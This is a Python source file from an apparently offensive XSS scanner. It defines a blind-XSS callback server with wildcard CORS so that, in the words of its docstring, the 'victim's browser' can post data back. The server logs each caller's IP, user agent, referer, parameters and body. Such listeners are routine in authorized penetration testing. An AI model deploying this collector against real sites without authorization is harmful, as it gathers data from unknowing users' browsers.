"""
scanner/blind_server.py
FIX: Tambah CORS headers agar browser korban bisa kirim callback cross-origin.
Tanpa CORS, XSS berhasil tapi callback tidak pernah sampai ke server.
"""

import asyncio, json
from aiohttp import web
from utils.logger import finding, info
from utils.config import Context


class BlindXSSServer:

    def __init__(self, host="0.0.0.0", port=8765):
        self.host    = host
        self.port    = port
        self._runner = None
        self.hits    = []

    async def start(self):
        app = web.Application()
        app.router.add_route("*", "/{path_info:.*}", self._handle)
        self._runner = web.AppRunner(app)
        await self._runner.setup()
        await web.TCPSite(self._runner, self.host, self.port).start()
        info(f"Blind XSS server: http://{self.host}:{self.port} (CORS enabled)")

    async def _handle(self, request):
        cors = {
            "Access-Control-Allow-Origin":  "*",
            "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
            "Access-Control-Allow-Headers": "*",
            "Access-Control-Max-Age":       "86400",
        }
        if request.method == "OPTIONS":
            return web.Response(status=204, headers=cors)

        params = dict(request.rel_url.query)
        body   = await request.text()
        try:    data = json.loads(body)
        except: data = {"raw": body[:500]} if body else {}

        self.hits.append({
            "ip":       request.remote,
            "ua":       request.headers.get("User-Agent", ""),
            "referer":  request.headers.get("Referer", ""),
            "params":   params,
            "body":     data,
        })

        finding(
            url      = f"http://{self.host}:{self.port}{request.rel_url}",
            param    = "blind_callback",
            payload  = (f"Blind XSS! IP={request.remote} "
                        f"UA={request.headers.get('User-Agent','')[:60]} "
                        f"Data={json.dumps(data)[:100]}"),
            xss_type = "blind_xss",
            context  = Context.UNKNOWN,
        )
        return web.Response(text="OK", status=200, headers=cors)

    async def stop(self):
        if self._runner:
            await self._runner.cleanup()
            info(f"Blind XSS server stopped. Hits: {len(self.hits)}")

    def get_hits(self):
        return list(self.hits)
